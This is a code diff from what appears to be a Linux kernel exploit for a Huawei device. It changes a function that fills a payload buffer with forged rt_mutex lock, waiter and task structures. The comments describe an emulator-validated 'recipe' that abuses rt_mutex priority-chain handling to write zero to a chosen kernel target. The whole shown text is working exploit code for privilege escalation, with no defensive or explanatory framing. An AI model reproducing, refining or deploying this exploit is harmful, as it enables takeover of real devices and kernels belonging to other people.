@@ -593,17 +593,32 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
          on the overlaid W->task); owner = NULL makes rt_mutex_adjust_
          prio_chain return right after rt_mutex_dequeue performed the
          write.  See main.c overlay comment. */
-      /* HUAWEI rt_mutex layout (replica DWARF+disasm, emulator-validated):
-         wait_lock@0 = DEBUG raw_spinlock {arch@0=0, magic@4=0xdead4ead,
-         owner_cpu@8=-1, owner@0x10=0(≠current)}, waiters.rb_root@0x18,
-         rb_leftmost@0x20, owner@0x28=0. Without the DEBUG magic every
-         trylock on this lock failed - all prior walks never ran. */
-      put64(p, LOCK_OFF + 0x00, 0xdead4ead00000000ULL);
-      put64(p, LOCK_OFF + 0x08, 0x00000000ffffffffULL);
-      put64(p, LOCK_OFF + 0x10, 0);
-      put64(p, LOCK_OFF + 0x18, fake_w0);
-      put64(p, LOCK_OFF + 0x20, fake_w0);
-      put64(p, LOCK_OFF + 0x28, 0);
+      /* v4 PROVEN recipe (emulator-validated, STATE 11.28) */
+      put64(p, LOCK_OFF + 0x00, 0xdead4ead00000000ULL); /* arch0+magic */
+      put64(p, LOCK_OFF + 0x08, 0x00000000ffffffffULL); /* owner_cpu=-1 */
+      put64(p, LOCK_OFF + 0x18, payload_base + 0x400);        /* root=FW0 */
+      put64(p, LOCK_OFF + 0x20, payload_base + 0x600 + 0x18); /* leftmost=W2PI */
+      put64(p, LOCK_OFF + 0x28, payload_base + 0x800);        /* owner=FKT */
+      /* FW0 @ +0x400: black root, prio 200 */
+      put64(p, 0x400 + 0x00, 1);
+      put64(p, 0x400 + 0x38, fake_lock);
+      put64(p, 0x400 + 0x40, 200);
+      /* W2 @ +0x600: erased node N=&prereq->pi_tree=W2+0x30 */
+      put64(p, 0x600 + 0x30, pselect_custom_target - 8);
+      put64(p, 0x600 + 0x38, 0);
+      put64(p, 0x600 + 0x40, 0);       /* VALUE=0: write-zero */
+      put64(p, 0x600 + 0x50, fake_lock);
+      put64(p, 0x600 + 0x58, 139);
+      /* FKT @ +0x800 */
+      put64(p, 0x800 + 0x28, 0x64); put64(p, 0x800 + 0x2c, 0x64);
+      put64(p, 0x800 + 0x30, 0x64); put64(p, 0x800 + 0x34, 0x64);
+      put64(p, 0x800 + 0x130, 130);
+      put64(p, 0x800 + 0x18, 0);
+      put64(p, 0x800 + 0xa60, 0xdead4ead00000000ULL);
+      put64(p, 0x800 + 0xa68, 0x00000000ffffffffULL);
+      put64(p, 0x800 + 0xa98, 0);
+      put64(p, 0x800 + 0xa80, payload_base + 0x600 + 0x18);
+      put64(p, 0x800 + 0xa88, 0);
     }
 
     put64(p, W0_OFF + 0x00, 1);
